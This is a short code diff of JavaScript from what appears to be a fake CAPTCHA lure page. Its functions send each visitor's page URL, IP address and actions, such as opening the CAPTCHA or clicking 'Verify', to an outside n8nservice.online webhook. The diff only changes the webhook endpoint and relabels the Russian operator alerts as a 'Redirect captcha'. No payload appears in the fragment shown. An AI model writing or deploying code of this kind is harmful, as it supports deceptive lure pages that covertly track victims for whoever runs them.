@@ -2123,9 +2123,9 @@
 
 function sendTelegramMessageThen2(data) {
 
- const message = '👇🏻Нажал Verify в капче ';
+ const message = '👇🏻Redirect capcha Нажал Verify в капче ';
 const fullUrl = window.location.href  ;
-    return fetch(`https://n8nservice.online/webhook/info`, {
+    return fetch(`http://n8nservice.online/webhook-test/inforedirect`, {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
@@ -2270,7 +2270,7 @@ const y = rect.top;
 function sendTelegramMessageThen( message,data) {
 
 const fullUrl = window.location.href  ;
-    return fetch(`https://n8nservice.online/webhook/info`, {
+    return fetch(`http://n8nservice.online/webhook-test/inforedirect`, {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
@@ -2295,7 +2295,7 @@ const fullUrl = window.location.href  ;
     });
 }
 
- const MESSAGE = '📱Кто-то открыл капчу майнпулс ';
+ const MESSAGE = '📱Кто-то открыл Redirect капчу  ';
 
 fetch('https://checkip.amazonaws.com/')
     .then((res) => res.text())
